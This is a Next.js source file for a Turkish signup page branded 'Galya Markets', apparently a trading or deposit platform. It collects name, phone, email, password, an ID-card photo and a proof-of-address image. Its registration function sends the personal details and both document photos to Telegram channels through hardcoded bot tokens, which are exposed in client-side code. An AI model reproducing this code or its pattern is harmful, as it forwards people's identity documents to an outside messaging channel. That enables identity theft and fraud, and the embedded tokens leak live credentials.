"use client"
import Link from "next/link";

import { Metadata } from "next";
import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { auth } from "../../../firebase";
import { createUserWithEmailAndPassword } from "firebase/auth";

import { useEffect } from 'react';
import { useRouter } from 'next/navigation'


const SignupPage = () => {
  const router = useRouter();


  const [firstName, setFirstName] = useState('');
  const [password, setPassword] = useState('');
  const [phone, setPhone] = useState('');
  const [email, setEmail] = useState('');
  const [idImage, setIdImage] = useState("");
  const [addressImage, setAddressImage] = useState("");
  const [photoContent, setPhotoContent] = useState(null);
  const [photoContent2, setPhotoContent2] = useState(null);
  const handleFirstNameChange = (e) => {
    setFirstName(e.target.value);
  };

  const handlePasswordChange = (e) => {
    setPassword(e.target.value);
  };

  const handlePhoneChange = (e) => {
    setPhone(e.target.value);
  };

  const handleEmailChange = (e) => {
    setEmail(e.target.value);
  };

  const handleIdImageChange = (e) => {
    if (e.target.files) {
      setIdImage(e.target.files[0]);
      setPhotoContent(e.target.files[0]);
    }
  };

  const handleAddressImageChange = (e) => {
    if (e.target.files) {
      setAddressImage(e.target.files[0]);
      setPhotoContent2(e.target.files[0]);
    }

  };
  const botToken = '6901253574:AAHbWBJJYHyJWudIM_B460DWK9YHXa3EzJg';
  const channelName = '@galyaislemler';



  async function registerUser() {
    await createUserWithEmailAndPassword(auth, email, password)
      .then(async (userCredential) => {
        const botToken = '6844283169:AAGEWaXEt3r7AZcHQPFwP82Nk-qgUfs1oBA';
        const channelName = '@galyakayit';
        const formData2 = new FormData();
        const formData = new FormData();
        formData.append('photo', photoContent);
        formData2.append('photo', photoContent2);


        const text = `🎊🎊 Yeni Kayıt 🎊🎊%0A  ➡️➡️${firstName}%0A ${phone} telefon numarası ve  ${email} maili bilgileri ile Kayıt işlemini tamamladı %0A Evraklarını bir alt mesajda gönderiyorum %0A Kontrol Eder misiniz ?. `;
        try {
          const sendResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${channelName}&text=${text} `);

          const uploadResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${channelName}`, {
            method: 'POST',
            body: formData
          });
          const uploadResponse2 = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${channelName}`, {
            method: 'POST',
            body: formData2
          });
          const sendResponse2 = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${channelName}&text=----====----====----====----====----====----`);
          const sendResponse3 = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${channelName}&text=----====----====----====----====----====----`);


          const uploadResult = await uploadResponse2.json();
          if (uploadResult.ok) {
            setAddressImage("")
            setEmail("")
            setFirstName("")
            setIdImage("")
            setPassword("")
            setPhone("")
            setPhotoContent(null)
            setPhotoContent2(null)
            router.push('/deposit/page')
            alert('Kayıt Başarılı , lütfen giriş yapınız');
            console.log('Photo uploaded successfully:', uploadResult);
            return uploadResult.result.photo[0].file_id;
          } else {
            return null;
          }
        } catch (error) {
          console.error('Photo upload error:', error);
          return null;
        }


        // ...
      })
      .catch((error) => {
        const errorCode = error.code;
        const errorMessage = error.message;
        alert(errorCode);
        // ..
      });

  }


  const handleSubmit = async (e) => {
    e.preventDefault();
    await registerUser();

    // Gönderim tamamlandıktan sonra formları sıfırlayabilirsiniz
    setFirstName('');
    setPassword('');
    setPhone('');
    setEmail('');
    setIdImage(null);
    setAddressImage(null);
  };

  return (
    <>
      <section className="relative z-10 overflow-hidden  xs:pt-[120px]  lg:pb-28 lg:pt-[120px]">
        <div className="container">
          <div className=" flex flex-wrap">
            <div className="w-full px-4">
              <div className="shadow-three mx-auto max-w-[500px] rounded bg-white px-6 py-10 dark:bg-dark  sm:p-[60px]">
                <h3 className="mb-3 text-center text-2xl font-bold text-black dark:text-white sm:text-3xl">
                  Hesap Oluştur
                </h3>
                <p className="mb-11 text-center text-base font-medium text-body-color">
                  Bütün Alanlar Zorunludur
                </p>



                <div className="mb-3 flex items-center justify-center">
                  <span className="hidden h-[1px] w-full max-w-[60px] bg-body-color/50 sm:block"></span>
                  <p className="w-full px-5 text-center text-base font-medium text-body-color">
                    Galya Markets
                  </p>
                  <span className="hidden h-[1px] w-full max-w-[60px] bg-body-color/50 sm:block"></span>
                </div>
                <form>
                  <div className="mb-3">
                    <label
                      htmlFor="name"
                      className="mb-3 block text-sm text-dark dark:text-white"
                    >
                      {" "}
                      İsim Soyisim{" "}
                    </label>
                    <input
                      required
                      type="text"
                      value={firstName}
                      onChange={handleFirstNameChange}
                      name="name"
                      placeholder="Tam isminizi Giriniz"
                      className="border-stroke dark:text-body-color-dark dark:shadow-two w-full rounded-sm border bg-[#f8f8f8] px-6 py-3 text-base text-body-color outline-none transition-all duration-300 focus:border-primary dark:border-transparent dark:bg-[#2C303B] dark:focus:border-primary dark:focus:shadow-none"
                    />
                  </div>
                  <div className="mb-3">
                    <label
                      htmlFor="email"
                      className="mb-3 block text-sm text-dark dark:text-white"
                    >
                      {" "}
                      Telefon{" "}
                    </label>
                    <input
                      required
                      type="text"
                      value={phone}
                      onChange={handlePhoneChange}

                      name="email"
                      placeholder="Telefon Numaranız"
                      className="border-stroke dark:text-body-color-dark dark:shadow-two w-full rounded-sm border bg-[#f8f8f8] px-6 py-3 text-base text-body-color outline-none transition-all duration-300 focus:border-primary dark:border-transparent dark:bg-[#2C303B] dark:focus:border-primary dark:focus:shadow-none"
                    />
                  </div>
                  <div className="mb-3">
                    <label
                      htmlFor="email"
                      className="mb-3 block text-sm text-dark dark:text-white"
                    >
                      {" "}
                      Email{" "}
                    </label>
                    <input
                      required
                      type="email"
                      value={email}
                      onChange={handleEmailChange}

                      name="email"
                      placeholder="Email Adresiniz"
                      className="border-stroke dark:text-body-color-dark dark:shadow-two w-full rounded-sm border bg-[#f8f8f8] px-6 py-3 text-base text-body-color outline-none transition-all duration-300 focus:border-primary dark:border-transparent dark:bg-[#2C303B] dark:focus:border-primary dark:focus:shadow-none"
                    />
                  </div>


                  <div className="mb-4">
                    <label
                      htmlFor="password"
                      className="mb-3 block text-sm text-dark dark:text-white"
                    >
                      {" "}
                      Şifreniz{" "}
                    </label>
                    <input
                      required
                      type="password"
                      value={password}
                      onChange={handlePasswordChange}
                      name="password"
                      placeholder="Şifreniz"
                      className="border-stroke dark:text-body-color-dark dark:shadow-two w-full rounded-sm border bg-[#f8f8f8] px-6 py-3 text-base text-body-color outline-none transition-all duration-300 focus:border-primary dark:border-transparent dark:bg-[#2C303B] dark:focus:border-primary dark:focus:shadow-none"
                    />
                  </div>
                  <div className="mb-4">
                    <label
                      htmlFor="password"
                      className="mb-3 block text-sm text-dark dark:text-white"
                    >
                      {" "}
                      Kimlik Ön Yüzü{" "}
                    </label>
                    <input
                      type="file"
                      required
                      accept="image/*"
                      onChange={handleIdImageChange}
                      name="password"
                      placeholder="Enter your Password"
                      className="border-stroke dark:text-body-color-dark dark:shadow-two w-full rounded-sm border bg-[#f8f8f8] px-6 py-3 text-base text-body-color outline-none transition-all duration-300 focus:border-primary dark:border-transparent dark:bg-[#2C303B] dark:focus:border-primary dark:focus:shadow-none"
                    />
                  </div>
                  <div className="mb-4">
                    <label
                      htmlFor="password"
                      className="mb-3 block text-sm text-dark dark:text-white"
                    >
                      {" "}
                      İkametgah Belginizin Resmi{" "}
                    </label>
                    <input
                      type="file"
                      required
                      accept="image/*"
                      onChange={handleAddressImageChange}
                      name="password"
                      placeholder="Enter your Password"
                      className="border-stroke dark:text-body-color-dark dark:shadow-two w-full rounded-sm border bg-[#f8f8f8] px-6 py-3 text-base text-body-color outline-none transition-all duration-300 focus:border-primary dark:border-transparent dark:bg-[#2C303B] dark:focus:border-primary dark:focus:shadow-none"
                    />
                  </div>

                  <div className="mb-3 flex">
                    <label
                      htmlFor="checkboxLabel"
                      className="flex cursor-pointer select-none text-sm font-medium text-body-color"
                    >
                      <div className="relative">
                        <input
                          type="checkbox"
                          id="checkboxLabel"
                          className="sr-only"
                        />
                        <div className="box mr-4 mt-1 flex h-5 w-5 items-center justify-center rounded border border-body-color border-opacity-20 dark:border-white dark:border-opacity-10">
                          <span className="opacity-0">
                            <svg
                              width="11"
                              height="8"
                              viewBox="0 0 11 8"
                              fill="none"
                              xmlns="http://www.w3.org/2000/svg"
                            >
                              <path
                                d="M10.0915 0.951972L10.0867 0.946075L10.0813 0.940568C9.90076 0.753564 9.61034 0.753146 9.42927 0.939309L4.16201 6.22962L1.58507 3.63469C1.40401 3.44841 1.11351 3.44879 0.932892 3.63584C0.755703 3.81933 0.755703 4.10875 0.932892 4.29224L0.932878 4.29225L0.934851 4.29424L3.58046 6.95832C3.73676 7.11955 3.94983 7.2 4.1473 7.2C4.36196 7.2 4.55963 7.11773 4.71406 6.9584L10.0468 1.60234C10.2436 1.4199 10.2421 1.1339 10.0915 0.951972ZM4.2327 6.30081L4.2317 6.2998C4.23206 6.30015 4.23237 6.30049 4.23269 6.30082L4.2327 6.30081Z"
                                fill="#3056D3"
                                stroke="#3056D3"
                                strokeWidth="0.4"
                              />
                            </svg>
                          </span>
                        </div>
                      </div>
                      <span>
                        Hesabınızı oluşturarak
                        <a href="#0" className="text-primary hover:underline">
                          {" "}
                          Şartlarımızı{" "}
                        </a>
                        , and our
                        <a href="#0" className="text-primary hover:underline">
                          {" "}
                          Gizlilik politikamızı{" "} kabul ediyorsunuz.
                        </a>
                      </span>
                    </label>
                  </div>
                  <div className="mb-6">
                    <button onClick={handleSubmit} className="shadow-submit dark:shadow-submit-dark flex w-full items-center justify-center rounded-sm bg-primary px-9 py-4 text-base font-medium text-white duration-300 hover:bg-primary/90">
                      Kayıt Ol
                    </button>
                  </div>
                </form>
                <p className="text-center text-base font-medium text-body-color">
                  Zaten Galya Üyesi misin ?{" "}
                  <Link href="/signin" className="text-primary hover:underline">
                    Giriş Yap
                  </Link>
                </p>
              </div>
            </div>
          </div>
        </div>
        <div className="absolute left-0 top-0 z-[-1]">
          <svg
            width="1440"
            height="969"
            viewBox="0 0 1440 969"
            fill="none"
            xmlns="http://www.w3.org/2000/svg"
          >
            <mask
              id="mask0_95:1005"
              style={{ maskType: "alpha" }}
              maskUnits="userSpaceOnUse"
              x="0"
              y="0"
              width="1440"
              height="969"
            >
              <rect width="1440" height="969" fill="#090E34" />
            </mask>
            <g mask="url(#mask0_95:1005)">
              <path
                opacity="0.1"
                d="M1086.96 297.978L632.959 554.978L935.625 535.926L1086.96 297.978Z"
                fill="url(#paint0_linear_95:1005)"
              />
              <path
                opacity="0.1"
                d="M1324.5 755.5L1450 687V886.5L1324.5 967.5L-10 288L1324.5 755.5Z"
                fill="url(#paint1_linear_95:1005)"
              />
            </g>
            <defs>
              <linearGradient
                id="paint0_linear_95:1005"
                x1="1178.4"
                y1="151.853"
                x2="780.959"
                y2="453.581"
                gradientUnits="userSpaceOnUse"
              >
                <stop stopColor="#4A6CF7" />
                <stop offset="1" stopColor="#4A6CF7" stopOpacity="0" />
              </linearGradient>
              <linearGradient
                id="paint1_linear_95:1005"
                x1="160.5"
                y1="220"
                x2="1099.45"
                y2="1192.04"
                gradientUnits="userSpaceOnUse"
              >
                <stop stopColor="#4A6CF7" />
                <stop offset="1" stopColor="#4A6CF7" stopOpacity="0" />
              </linearGradient>
            </defs>
          </svg>
        </div>
      </section>
    </>
  );
};

export default SignupPage;
